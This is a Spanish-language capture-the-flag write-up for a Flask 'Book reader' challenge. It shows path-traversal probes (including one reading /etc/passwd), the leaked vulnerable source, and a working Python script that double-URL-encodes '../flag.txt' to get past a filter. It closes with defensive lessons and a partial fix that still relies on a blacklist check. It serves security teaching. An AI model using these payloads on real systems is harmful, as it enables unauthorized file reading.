# CTF Challenge: Reader - Writeup

## Información del Reto
- **Nombre**: Reader
- **Puntos**: 499
- **Servidor**: 34.171.23.62:8005
- **Flag**: `ALP{th3_b3st_b00k_r3ad3r}`

---

## Reconocimiento

### Paso 1: Exploración inicial del servicio

Al conectarse al servicio, descubrimos una aplicación web Flask llamada "Book reader":

```bash
curl http://34.171.23.62:8005
```

La aplicación muestra un formulario con un selector de capítulos que envía un parámetro `filename` a través de POST:

```html
<form method="post" action="/home" enctype="multipart/form-data">
    <select name="filename" class="form-control">
        <option value="text/intro.txt">Intro</option>
        <option value="text/chapter1.txt">Chapter 1</option>
        <option value="text/chapter2.txt">Chapter 2</option>
    </select>
</form>
```

### Paso 2: Prueba de Path Traversal básico

Intentamos un ataque de Path Traversal clásico:

```bash
curl -X POST http://34.171.23.62:8005/home -d "filename=../../../etc/passwd"
```

**Resultado**: `try harder...`

Esto indica que hay un filtro bloqueando el path traversal.

---

## Análisis del Código Fuente

### Paso 3: Lectura del código fuente

Al intentar leer `app.py`, obtuvimos el código fuente completo:

```bash
curl -X POST http://34.171.23.62:8005/home -d "filename=app.py"
```

**Código vulnerable encontrado**:

```python
@app.route("/home", methods=['POST'])
def home():
    filename = urllib.parse.unquote(request.form['filename'])
    read='try harder...'
    if '../' not in filename:
        filename = urllib.parse.unquote(filename)  # ← Segunda decodificación!
        if os.path.isfile(current_app.root_path + '/'+ filename):
            with current_app.open_resource(filename) as f:
                read = f.read().decode('utf8')
    return render_template("index.html",read = read)
```

---

## Identificación de la Vulnerabilidad

### **Double URL Decoding**

El código tiene una vulnerabilidad crítica:

1. **Primera decodificación**: `filename = urllib.parse.unquote(request.form['filename'])`
2. **Verificación**: `if '../' not in filename:`
3. **Segunda decodificación**: `filename = urllib.parse.unquote(filename)` ← **VULNERABILIDAD**

El problema es que hace `urllib.parse.unquote()` **DOS VECES**:
- La primera decodificación se verifica contra el filtro
- La segunda decodificación ocurre DESPUÉS de pasar el filtro

---

## Explotación

### Concepto del bypass

Si codificamos el payload **dos veces**, podemos evadir el filtro:

```
Payload original:    ../
Primera codificación: %2E%2E%2F
Segunda codificación: %252E%252E%252F
```

**Flujo de la explotación**:

1. Enviamos: `%252E%252E%252F`
2. Primera `unquote()`: `%252E%252E%252F` → `%2E%2E%2F` (no contiene `../`, ¡pasa el filtro!)
3. Segunda `unquote()`: `%2E%2E%2F` → `../` (¡path traversal exitoso!)

### Script de explotación

```python
import requests
import urllib.parse

url = "http://34.171.23.62:8005/home"

# Double URL encode the path traversal
payload = "../flag.txt"
encoded_once = urllib.parse.quote(payload, safe='')
encoded_twice = urllib.parse.quote(encoded_once, safe='')

# Encoded once:  ..%2Fflag.txt
# Encoded twice: ..%252Fflag.txt

data = {"filename": encoded_twice}
response = requests.post(url, data=data)

# Extract the content
import re
match = re.search(r'<p style="font-size:2em;">\s*(.*?)\s*</p>', response.text, re.DOTALL)
if match:
    print(match.group(1))
```

### Resultado

```bash
python3 exploit.py
```

**Output**:
```
COOOOOOOL !!!!!!!!!! the flag is ALP{th3_b3st_b00k_r3ad3r}
```

---

## Flag

```
ALP{th3_b3st_b00k_r3ad3r}
```

---

## Lecciones Aprendidas

### Vulnerabilidad: CWE-174 (Double Decoding)

1. **Nunca decodificar entrada del usuario múltiples veces**
2. La decodificación debe hacerse UNA sola vez, antes de cualquier validación
3. Los filtros de seguridad deben aplicarse DESPUÉS de toda normalización

### Código seguro

```python
@app.route("/home", methods=['POST'])
def home():
    # Decodificar UNA sola vez
    filename = urllib.parse.unquote(request.form['filename'])
    read = 'try harder...'

    # Validar DESPUÉS de decodificar
    if '../' not in filename and not filename.startswith('/'):
        # Mejor aún: usar una whitelist
        if os.path.isfile(current_app.root_path + '/' + filename):
            with current_app.open_resource(filename) as f:
                read = f.read().decode('utf8')

    return render_template("index.html", read=read)
```

### Mejores prácticas:

1. Usar **whitelist** en lugar de blacklist
2. Validar con `os.path.abspath()` y verificar que el path esté dentro del directorio permitido
3. Nunca confiar en la entrada del usuario
4. Evitar operaciones de normalización múltiples

---

## Referencias

- [CWE-174: Double Decoding of the Same Data](https://cwe.mitre.org/data/definitions/174.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.asp)

---

**Autor**: CTF Player
**Fecha**: 2025-11-20
**Categoría**: Web Exploitation
**Técnica**: Double URL Decoding / Path Traversal
